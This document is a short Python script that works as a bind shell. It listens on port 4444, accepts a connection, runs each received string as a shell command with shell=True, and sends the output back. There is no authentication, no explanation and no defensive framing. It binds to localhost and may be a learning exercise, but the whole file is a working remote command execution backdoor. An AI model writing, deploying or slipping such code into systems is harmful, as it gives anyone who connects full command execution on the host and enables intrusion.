import socket
import subprocess



server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind(("localhost",4444))
server.listen(5)

print("Server is waiting")
client,addr=server.accept()
print("client connected ",addr)


while True:
    command=client.recv(1024)
    if not command:
        break
    print("given command "+command.decode())
    output=subprocess.check_output(command.decode(),shell=True)
    if output.decode() =="":
        client.send("no output".encode())
    else:
        client.send(output)




server.close()